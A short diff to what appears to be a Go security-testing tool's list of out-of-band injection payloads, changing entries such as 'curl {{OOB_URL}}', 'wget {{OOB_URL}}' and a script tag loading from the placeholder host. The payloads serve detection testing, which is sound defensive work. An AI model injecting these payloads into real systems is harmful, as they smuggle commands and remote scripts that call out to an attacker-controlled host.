@@ -72,11 +72,9 @@ var maliciousPathTraversal = []string{
 
 var maliciousOOB = []string{
 	"{{OOB_URL}}",
-	"http://{{OOB_URL}}",
-	"curl http://{{OOB_URL}}",
-	"wget http://{{OOB_URL}}",
-	"<script src=\"http://{{OOB_URL}}\"></script>",
-	"ping -c 1 {{OOB_URL}}",
+	"curl {{OOB_URL}}",
+	"wget {{OOB_URL}}",
+	"<script src=\"{{OOB_URL}}\"></script>",
 }
 
 // ─── Type confusion values ──────────────────────────────
